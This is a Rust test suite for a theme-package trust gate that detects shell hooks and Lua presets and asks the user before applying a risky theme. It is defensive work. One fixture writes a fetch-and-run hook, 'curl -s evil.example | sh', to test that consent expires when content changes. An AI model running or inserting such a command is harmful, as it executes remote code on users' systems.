    /// finds into the fragment `assemble.sh` writes to `overlay.lua` — so a
    /// `.frag` carrying Lua there executes exactly like a `.lua`.
    ///
    /// `shaders/` is the deliberate asymmetry this detector mirrors:
    /// `shader.sh` never `cat`s the shader (it writes a validated Lua
    /// wrapper whose PATH names the built-in shader), so `shaders/*.frag`
    /// never reaches `overlay.lua` and stays OUT of the report — while
    /// `shaders/*.lua` is still named like every other Lua preset.
    #[test]
    fn a_frag_in_a_catted_category_is_reported_but_a_shader_frag_is_not() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "evil.frag");
        write_preset(&theme, "borders", "evil.frag");
        write_preset(&theme, "shaders", "02_monocromo.frag");
        write_preset(&theme, "shaders", "wrapper.lua");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets,
            vec![
                LuaPreset {
                    category: "animations".into(),
                    file_name: "evil.frag".into(),
                    body: written_body(),
                },
                LuaPreset {
                    category: "borders".into(),
                    file_name: "evil.frag".into(),
                    body: written_body(),
                },
                LuaPreset {
                    category: "shaders".into(),
                    file_name: "wrapper.lua".into(),
                    body: written_body(),
                },
            ],
            "a .frag in a category the scripts cat must be reported and \
             shaders/*.frag must not, got: {:?}",
            report.lua_presets
        );
        assert!(!report.is_empty(), "the .frag presets must not read as empty");
    }

    /// Acceptance 2: a theme carrying neither applies exactly as before —
    /// the detector says so with an empty report.
    #[test]
    fn a_theme_with_neither_hooks_nor_lua_is_empty() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let provider = theme.join("providers").join("hve-presets");
        fs::create_dir_all(&provider).unwrap();
        fs::write(provider.join("state.json"), "{\"active_anim_file\":\"x.lua\"}").unwrap();

        let report = inspect_theme_package(&theme);

        assert_eq!(report, ThemeTrustReport::default());
        assert!(report.is_empty());
    }

    /// READ-ONLY and TOTAL: inspecting a theme changes nothing on disk, and
    /// a theme path that does not exist yields an empty report without being
    /// created (a detector never writes).
    #[test]
    fn inspection_is_read_only_and_never_creates_anything() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(&theme, "[hooks]\nstarted = \"x.sh\"\n");
        write_preset(&theme, "animations", "a.lua");
        let before = tree(&theme);

        let _ = inspect_theme_package(&theme);
        assert_eq!(tree(&theme), before, "inspection must not touch the tree");

        let missing = tmp.path().join("NeverExisted");
        assert!(inspect_theme_package(&missing).is_empty());
        assert!(
            !missing.exists(),
            "the detector must never create the theme directory it is given"
        );
    }

    /// W1d FAIL CLOSED: garbage is not "parse as far as it goes" — a file
    /// that does not parse yields exactly ONE conservative entry (the file
    /// and the cause), never a partial report and never an empty one. The
    /// conservative entry holds the gate (the keeper sees the note, not a
    /// hook that runs).
    #[test]
    fn a_missing_empty_or_garbage_settings_toml_never_panics() {
        let tmp = tempfile::tempdir().unwrap();

        // Missing: the provider dir exists, the file does not.
        let missing = tmp.path().join("Missing");
        fs::create_dir_all(missing.join("providers").join("noctalia-v5")).unwrap();

        // Empty.
        let empty = tmp.path().join("Empty");
        write_settings(&empty, "");

        // Garbage: not valid TOML.
        let garbage = tmp.path().join("Garbage");
        write_settings(
            &garbage,
            "@@@ not toml at all\n\
             no equals sign here\n\
             [hooks\n\
             started = \"lost under the broken header\"\n\
             [hooks]\n\
             colors_changed = \"still a command\n\
             = \"no key\"\n\
             nothing_here\n\
             ",
        );

        assert!(inspect_theme_package(&missing).shell_hooks.is_empty());
        assert!(inspect_theme_package(&empty).shell_hooks.is_empty());
        let report = inspect_theme_package(&garbage);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "hooks table".into(),
                command: format!(
                    "the hooks table in {} could not be read by this scan: \
                     the file does not parse as TOML; it may carry shell commands \
                     that are not listed here",
                    garbage
                        .join("providers")
                        .join("noctalia-v5")
                        .join("settings.toml")
                        .display()
                ),
            }],
            "a garbage file is one conservative entry naming the parse failure, \
             never a partial or empty report: {:?}",
            report.shell_hooks
        );
        assert!(!report.is_empty());
    }

    /// TOTAL, and (W1d-b) FAIL CLOSED: a non-UTF8 `settings.toml` cannot be
    /// read as text at all — it must not panic, and it must not read as an
    /// empty report either: the reader refused it, so it is reported as one
    /// conservative "could not be inspected" entry.
    #[test]
    fn a_non_utf8_settings_toml_never_panics() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        let settings = dir.join("settings.toml");
        fs::write(&settings, b"\xff\xfe[hooks]\nstarted = \"\xff\xfe\"\n").unwrap();

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "hooks table".into(),
                command: format!(
                    "the settings file {} could not be inspected by this scan: \
                     {} is not valid UTF-8 text; it may carry shell commands \
                     that are not listed here",
                    settings.display(),
                    settings.display()
                ),
            }],
            "a settings.toml the reader refused is uninspected, not hook-free: {:?}",
            report.shell_hooks
        );
    }

    /// TOTAL: a preset file name that is not valid UTF-8 is skipped, exactly
    /// like `install_theme_presets` skips it (it can never be installed, so
    /// it can never run).
    #[cfg(unix)]
    #[test]
    fn a_preset_file_name_that_is_not_utf8_is_skipped() {
        use std::os::unix::ffi::OsStrExt;
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join(crate::theme_presets::PRESETS_DIR).join("animations");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(std::ffi::OsStr::from_bytes(b"\xff.lua")), b"-- opaque\n").unwrap();

        let report = inspect_theme_package(&theme);

        assert!(report.lua_presets.is_empty(), "got: {:?}", report.lua_presets);
        assert!(report.is_empty());
    }

    // ── W2: the consent gate decisions ────────────────────────────────

    /// A package that carries a shell hook (the CRITICAL shape).
    fn risky_theme(root: &Path) -> PathBuf {
        let theme = root.join("Risky");
        write_settings(&theme, "[hooks]\nstarted = \"sddm-watch.sh\"\n");
        theme
    }

    /// A package that carries neither hooks nor Lua presets.
    fn clean_theme(root: &Path) -> PathBuf {
        let theme = root.join("Plain");
        let provider = theme.join("providers").join("hve-presets");
        fs::create_dir_all(&provider).unwrap();
        fs::write(provider.join("state.json"), "{}").unwrap();
        theme
    }

    /// W2 acceptance 3 (decision half): a theme carrying hooks is NOT
    /// applied — the gate holds it and shows the warning — and it applies
    /// ONLY after the keeper confirms, on the same entry point that asked.
    #[test]
    fn gate_holds_a_risky_theme_and_applies_it_only_after_confirmation() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold,
            "a theme carrying a shell hook must be held, not applied"
        );
        assert!(gate.is_open(), "the warning must be open for the held attempt");
        assert_eq!(
            gate.pending(),
            Some(&PendingApply {
                name: "Risky".into(),
                index: 3,
                origin: ApplyOrigin::Gallery,
                report: report.clone(),
            }),
            "the gate must remember what to apply and which path asked"
        );
        // A second attempt while the warning is open changes nothing.
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
            GateDecision::Blocked
        );

        // Confirm: the pending attempt comes back so the caller can
        // re-invoke the SAME entry point, armed for exactly that name.
        let pending = gate.begin_confirm().expect("a held attempt to confirm");
        assert_eq!(pending.name, "Risky");
        assert_eq!(pending.origin, ApplyOrigin::Gallery);
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
            GateDecision::Proceed,
            "the confirmed re-entry must apply exactly as before"
        );
        gate.finish_confirm();
        assert!(!gate.is_open(), "confirming must close the warning");
        assert_eq!(gate.confirmed(), None, "the confirmation is one-shot");

        // The gate itself remembers nothing across attempts: without a
        // stored acceptance the same theme warns again. Turning that into a
        // silent apply is the caller's `already_accepted` input (W2c).
        assert_eq!(
            gate.request("Risky", 3, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold,
            "without a stored acceptance the same risky theme must warn again"
        );
    }

    /// W2 acceptance 3 (declining): Cancel forgets the attempt, applies
    /// nothing, and the next attempt asks again.
    #[test]
    fn gate_cancel_changes_nothing_and_the_next_attempt_warns_again() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Panel, &report, false),
            GateDecision::Hold
        );
        assert!(gate.cancel(), "declining a held attempt reports it");
        assert!(!gate.is_open(), "Cancel must close the warning");
        assert_eq!(gate.pending(), None, "nothing stays pending after Cancel");
        assert_eq!(
            gate.confirmed(),
            None,
            "Cancel must never arm a confirmation"
        );
        assert!(
            !gate.cancel(),
            "cancel with nothing pending is a no-op (idempotent)"
        );
        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Panel, &report, false),
            GateDecision::Hold,
            "after declining, applying the same theme must warn again"
        );
    }

    /// W2 acceptance 2: a theme carrying neither hooks nor Lua presets
    /// applies exactly as it did before the gate existed — no hold, no
    /// warning, no pending state.
    #[test]
    fn gate_lets_a_theme_with_neither_hooks_nor_lua_apply_without_a_warning() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&clean_theme(tmp.path()));
        assert!(report.is_empty(), "precondition: the fixture carries nothing");
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Gallery, &report, false),
            GateDecision::Proceed,
            "the pre-W2 behaviour must be untouched for a clean theme"
        );
        assert!(!gate.is_open());
        assert_eq!(gate.pending(), None);
        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Panel, &report, false),
            GateDecision::Proceed,
            "the second path must be gated by the same rule"
        );
    }

    /// The warning is MODAL: while it is open no other apply attempt gets
    /// through — not even a clean theme — and the pending attempt stays
    /// the one the keeper was asked about.
    #[test]
    fn gate_is_modal_while_the_warning_is_open() {
        let tmp = tempfile::tempdir().unwrap();
        let risky = inspect_theme_package(&risky_theme(tmp.path()));
        let clean = inspect_theme_package(&clean_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Gallery, &risky, false),
            GateDecision::Hold
        );
        assert_eq!(
            gate.request("Plain", 1, ApplyOrigin::Gallery, &clean, false),
            GateDecision::Blocked,
            "nothing may apply behind the open warning"
        );
        assert_eq!(
            gate.request("Other", 2, ApplyOrigin::Panel, &risky, false),
            GateDecision::Blocked
        );
        assert_eq!(
            gate.pending().map(|p| p.name.as_str()),
            Some("Risky"),
            "the modal keeps the attempt it was opened for"
        );
    }

    /// A confirmation that never reached `request` (the mutating guard
    /// swallowed the re-entry, the window went away) must not leave stale
    /// consent: the next attempt on that theme warns again.
    #[test]
    fn a_confirmation_that_never_reaches_the_request_expires() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 5, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold
        );
        let pending = gate.begin_confirm().expect("held attempt");
        assert_eq!(pending.index, 5);
        // The re-invoke never happened: the caller closes the round trip.
        gate.finish_confirm();
        assert!(!gate.is_open());
        assert_eq!(
            gate.request("Risky", 5, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold,
            "an unspent confirmation must not silently apply the theme"
        );
    }

    /// W2c spec S4, and the fix of W2's first MEDIUM: the confirmation
    /// authorises the content the warning SHOWED, never the theme's name.
    /// The re-entry re-reads the package, so a package REWIRED while the
    /// modal was up must warn again instead of applying on the old consent.
    #[test]
    fn an_armed_confirmation_of_changed_content_warns_again() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = risky_theme(tmp.path());
        let mut gate = TrustGate::new();

        let shown = inspect_theme_package(&theme);
        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Gallery, &shown, false),
            GateDecision::Hold
        );
        let pending = gate.begin_confirm().expect("held attempt");
        assert_eq!(pending.name, "Risky");

        // The keeper pressed Continue; while the modal was up the package
        // was rewired to a DIFFERENT command.
        write_settings(&theme, "[hooks]\nstarted = \"curl -s evil.example | sh\"\n");
        let fresh = inspect_theme_package(&theme);
        assert_ne!(
            fresh, shown,
            "the rewrite must be visible to the detector for this test to mean anything"
        );

        assert_eq!(
            gate.request("Risky", 0, ApplyOrigin::Gallery, &fresh, false),
            GateDecision::Hold,
            "a package rewired after the confirmation must warn again, not apply on the old consent"
        );
        assert!(gate.is_open(), "the fresh warning must be the open one");
        assert_eq!(
            gate.pending().map(|p| p.report.clone()),
            Some(fresh),
            "the warning must show the FRESH content, not the content the keeper accepted"
        );
    }

    /// W2c spec S4, second half: the same content that was SHOWN still
    /// applies on the armed re-entry (the ordinary confirmation), and the
    /// armed token is one-shot — it never authorises a later attempt.
    #[test]
    fn an_armed_confirmation_of_identical_content_applies_once() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
            GateDecision::Hold
        );
        let pending = gate.begin_confirm().expect("held attempt");
        assert_eq!(pending.origin, ApplyOrigin::Panel);
        assert_eq!(
            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
            GateDecision::Proceed,
            "the confirmed content must apply"
        );
        gate.finish_confirm();
        assert_eq!(
            gate.request("Risky", 1, ApplyOrigin::Panel, &report, false),
            GateDecision::Hold,
            "the confirmation is one-shot: the next attempt warns again"
        );
    }

    /// W2c spec S1/S2: an acceptance the keeper already gave for EXACTLY
    /// this content applies with no warning — the warning is only for
    /// content nobody has judged yet. W2 failing test.
    #[test]
    fn an_already_accepted_content_applies_without_a_warning() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&risky_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Risky", 2, ApplyOrigin::Gallery, &report, true),
            GateDecision::Proceed,
            "content the keeper already accepted must apply with no warning"
        );
        assert!(!gate.is_open(), "no warning is owed for accepted content");
        assert_eq!(
            gate.request("Risky", 2, ApplyOrigin::Gallery, &report, false),
            GateDecision::Hold,
            "without that acceptance the same content is held again"
        );
    }

    /// W2c spec S5: an acceptance is NEVER consulted for a package that
    /// carries nothing — a clean theme's behaviour does not depend on the
    /// store at all, so a stale acceptance can never mask a clean apply.
    #[test]
    fn a_clean_package_ignores_any_stored_acceptance() {
        let tmp = tempfile::tempdir().unwrap();
        let report = inspect_theme_package(&clean_theme(tmp.path()));
        let mut gate = TrustGate::new();

        assert_eq!(
            gate.request("Plain", 0, ApplyOrigin::Gallery, &report, true),
            GateDecision::Proceed,
            "a clean package applies, and its path does not depend on the store"
        );
        assert!(report.is_empty(), "the fixture must carry neither hooks nor presets");
    }

    // ── W2c: the preset BODY is part of what runs and of what is accepted ─

    /// W2c: the report carries the preset's BODY, not only its name — the
    /// body is what runs (the apply copies this file as it is on disk and
    /// the assembled overlay executes it), so it is part of what the keeper
    /// accepts.
    #[test]
    fn a_preset_is_reported_with_the_body_that_would_run() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "Space.lua");

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets,
            vec![LuaPreset {
                category: "animations".into(),
                file_name: "Space.lua".into(),
                body: written_body(),
            }],
            "the preset must be reported WITH its body, got: {:?}",
            report.lua_presets
        );
        assert!(
            !report.is_uninspected(),
            "a preset this scan read in full is INSPECTED"
        );
    }

    /// W2c: a body over the remember bound is reported as UNREADABLE, never
    /// truncated and never empty. Truncating would make two DIFFERENT long
    /// bodies compare equal — the collision this whole store exists to avoid
    /// — and an empty body would read as "this preset contains nothing".
    #[test]
    fn a_preset_body_over_the_remember_bound_is_reported_unreadable() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        fs::create_dir_all(&dir).unwrap();
        // Over this module's bound, well UNDER the shared reader's 4 MiB
        // one: the class is "too big to remember", not "too big to read".
        fs::write(dir.join("Space.lua"), "x".repeat(MAX_PRESET_BODY_BYTES + 1)).unwrap();

        let report = inspect_theme_package(&theme);

        match &report.lua_presets[0].body {
            PresetBody::Unreadable(cause) => assert!(
                cause.contains("could not be KEPT"),
                "the cause must be TRUE of the file it names: this one WAS read (the scan \
                 counted its bytes), it just does not fit the bound, got: {cause}"
            ),
            other => panic!("an over-bound body must be UNREADABLE, got {other:?}"),
        }
        assert!(
            report.is_uninspected(),
            "a preset nobody read in full makes the whole report uninspected"
        );
        assert!(
            !report.is_empty(),
            "an unreadable preset must never read as an empty report"
        );
    }

    /// W2c + W10: a preset file the shared reader REFUSES (here: not valid
    /// UTF-8) is reported as unreadable WITH its cause, and the report is
    /// uninspected — so the keeper is asked every time instead of a decision
    /// being remembered over a body nobody read.
    #[test]
    fn a_preset_the_reader_refuses_is_reported_unreadable() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("Space.lua"), [0xffu8, 0xfe, 0x00]).unwrap();

        let report = inspect_theme_package(&theme);

        assert!(
            matches!(&report.lua_presets[0].body, PresetBody::Unreadable(cause) if cause.contains("could not be read")),
            "a refused preset body must be reported with its cause, got: {:?}",
            report.lua_presets
        );
        assert!(report.is_uninspected());
    }

    /// The preset body reaches the store through the report, so a body the
    /// scan could not read must not survive a round trip as an EMPTY body:
    /// nothing is remembered for such a report, and the store's own
    /// comparison maps the body to "none", which no stored entry can equal.
    #[test]
    fn an_unreadable_preset_body_never_matches_a_stored_one() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_preset(&theme, "animations", "Space.lua");
        let readable = inspect_theme_package(&theme);
        let mut store = crate::theme_trust_store::TrustStore::default();
        store.remember("Space", &readable);
        assert!(store.accepts("Space", &readable));

        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        fs::write(dir.join("Space.lua"), "y".repeat(MAX_PRESET_BODY_BYTES + 1)).unwrap();
        let unreadable = inspect_theme_package(&theme);
        assert!(unreadable.is_uninspected());
        assert!(
            !store.accepts("Space", &unreadable),
            "a body nobody read in full can never be the accepted one"
        );
        // The store compares what it is GIVEN, so the OLD report still
        // matches the old entry — and that is the mechanism working: the
        // caller always inspects the package FRESH, so the report it hands
        // in is the unreadable one above, which matches nothing.
        assert!(
            store.accepts("Space", &readable),
            "the store is a snapshot keyed by content: the old entry answers for the old report"
        );
    }

    // ── W2c-c: the budget one THEME may spend, and the one a STORE may hold ─

    /// W2c-c: one theme spends at most [`MAX_REMEMBERED_THEME_BYTES`] of code
    /// in a report, so no single theme can ask a store to remember megabytes.
    /// A preset that does not fit is still NAMED and reported as NOT READ with
    /// the cause — never truncated, never silently dropped.
    #[test]
    fn a_theme_spends_at_most_its_budget_on_preset_bodies() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        fs::create_dir_all(&dir).unwrap();
        // Nine bodies at the per-preset cap: 128 KiB of budget fits eight.
        for i in 0..9 {
            fs::write(dir.join(format!("p{i}.lua")), "x".repeat(MAX_PRESET_BODY_BYTES)).unwrap();
        }

        let report = inspect_theme_package(&theme);

        assert_eq!(
            report.lua_presets.len(),
            9,
            "every preset must still be NAMED, even the ones not read"
        );
        assert!(
            report.remembered_bytes("Theme") <= MAX_REMEMBERED_THEME_BYTES,
            "the report must not exceed the budget it advertises, got {}",
            report.remembered_bytes("Theme")
        );
        let unread = report
            .lua_presets
            .iter()
            .filter(|p| matches!(p.body, PresetBody::Unreadable(_)))
            .count();
        assert!(
            unread >= 1,
            "the presets that do not fit must be reported NOT READ, got {:?}",
            report.lua_presets
        );
        assert!(
            report.is_uninspected(),
            "and that makes the report uninspected, so nothing is remembered for it"
        );
        for p in &report.lua_presets {
            if let PresetBody::Unreadable(cause) = &p.body {
                assert!(
                    cause.contains("budget for a theme HVE can remember"),
                    "the cause must name the budget that stopped it, got: {cause}"
                );
            }
        }
    }

    /// W2c-c: hooks are always reported IN FULL — the warning shows their
    /// command text, and hiding one would be worse than a large report — so a
    /// theme whose hooks alone blow the budget is still reported whole. Two
    /// cases follow from that, and BOTH must end in "not rememberable":
    ///
    /// - With no presets, nothing was left unread: the report is COMPLETE and
    ///   only too large, which is exactly why `remembered_bytes` exists.
    /// - With a preset, the preset is not read at all (the budget is spent),
    ///   so the report is also uninspected.
    #[test]
    fn a_theme_whose_hooks_alone_exceed_the_budget_is_reported_whole() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        write_settings(
            &theme,
            &format!(
                "[hooks]\nstarted = \"{}\"\n",
                "x".repeat(MAX_REMEMBERED_THEME_BYTES + 1)
            ),
        );

        let hooks_only = inspect_theme_package(&theme);
        assert_eq!(hooks_only.shell_hooks.len(), 1, "the hook must be reported");
        assert!(
            hooks_only.shell_hooks[0].command.len() > MAX_REMEMBERED_THEME_BYTES,
            "the command must be reported whole, not trimmed"
        );
        assert!(
            !hooks_only.is_uninspected(),
            "nothing was left unread: the report is complete, only too large"
        );
        assert!(
            hooks_only.remembered_bytes("Theme") > MAX_REMEMBERED_THEME_BYTES,
            "a consumer must be able to see it is over budget"
        );

        write_preset(&theme, "animations", "Space.lua");
        let with_a_preset = inspect_theme_package(&theme);
        assert!(
            matches!(with_a_preset.lua_presets[0].body, PresetBody::Unreadable(_)),
            "with the budget spent, the preset is not read — and the report says so"
        );
        assert!(
            with_a_preset.is_uninspected(),
            "which makes it uninspected as well as over budget"
        );
        assert!(
            with_a_preset.remembered_bytes("Theme") > MAX_REMEMBERED_THEME_BYTES,
            "and still over budget"
        );
    }

    // ── W10b: the theme's settings.toml is an UNTRUSTED file ───────────

    /// A FIFO named like a theme's `settings.toml` must be REFUSED by the
    /// trust gate, not block it: the gate runs on the apply path BEFORE the
    /// warning, so a blocking read would hang the whole apply. The scan runs
    /// on a worker thread, and a timeout proves it returned. W1d-b: the
    /// refusal is a file nobody inspected, so it reports the conservative
    /// entry instead of a silent empty report.
    #[test]
    fn inspect_refuses_a_fifo_settings_toml_instead_of_blocking() {
        use std::os::unix::ffi::OsStrExt;
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let dir = theme.join("providers").join("noctalia-v5");
        fs::create_dir_all(&dir).unwrap();
        let fifo = dir.join("settings.toml");
        let c = std::ffi::CString::new(fifo.as_os_str().as_bytes()).unwrap();
        let rc = unsafe { libc::mkfifo(c.as_ptr(), 0o600) };
        assert_eq!(rc, 0, "mkfifo must succeed for the sandbox fixture");

        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(inspect_theme_package(&theme));
        });
        match rx.recv_timeout(std::time::Duration::from_secs(3)) {
            Ok(report) => assert_eq!(
                report.shell_hooks,
                vec![ShellHook {
                    provider: "noctalia-v5".into(),
                    key: "hooks table".into(),
                    command: format!(
                        "the settings file {} could not be inspected by this scan: \
                         {} is not a regular file; it may carry shell commands \
                         that are not listed here",
                        fifo.display(),
                        fifo.display()
                    ),
                }],
                "a refused FIFO settings.toml must be reported as UNINSPECTED, \
                 got {:?}",
                report.shell_hooks
            ),
            Err(_) => {
                panic!("the trust gate blocked on a FIFO settings.toml instead of refusing it")
            }
        }
    }

    /// An oversized (but VALID) `settings.toml` is refused by W10's per-file
    /// bound — and that refusal must never degrade to "no hooks from this
    /// file" (W1d-b: that was a FAIL-OPEN. The file is valid TOML, the apply
    /// copies it verbatim over the live config and the hook runs with the
    /// gate silent). A read refusal produces the same conservative "I could
    /// not inspect this file" entry a parse failure produces.
    #[test]
    fn inspect_refuses_an_oversized_settings_toml() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        let settings = theme
            .join("providers")
            .join("noctalia-v5")
            .join("settings.toml");
        fs::create_dir_all(settings.parent().unwrap()).unwrap();
        let mut content = b"[hooks]\nstarted = \"echo pwned\"\n".to_vec();
        content.resize(crate::theme_package::MAX_THEME_FILE_BYTES as usize + 1, b'\n');
        fs::write(&settings, content).unwrap();

        let report = inspect_theme_package(&theme);
        assert_eq!(
            report.shell_hooks,
            vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "hooks table".into(),
                command: format!(
                    "the settings file {} could not be inspected by this scan: \
                     larger than the {}-byte bound for an untrusted theme file; \
                     it may carry shell commands that are not listed here",
                    settings.display(),
                    crate::theme_package::MAX_THEME_FILE_BYTES
                ),
            }],
            "an over-bound settings.toml is a file nobody inspected and must be \
             reported as one conservative entry, never as an empty report: {:?}",
            report.shell_hooks
        );
        assert!(
            !report.is_empty(),
            "the gate must hold over a file the apply could still copy verbatim"
        );
    }

    /// W1d-b: a MISSING `settings.toml` is NOT a read refusal. A theme that
    /// carries no settings file carries no hooks, so the report stays EMPTY
    /// and a clean theme never warns (acceptance criterion 2). Only a file
    /// that EXISTS and could not be read is a refusal.
    #[test]
    fn a_missing_settings_toml_reports_an_empty_report_not_a_conservative_entry() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Theme");
        fs::create_dir_all(theme.join("providers").join("noctalia-v5")).unwrap();

        let report = inspect_theme_package(&theme);

        assert!(
            report.shell_hooks.is_empty(),
            "a theme with no settings file carries no hooks, got: {:?}",
            report.shell_hooks
        );
        assert!(report.is_empty());
    }
}
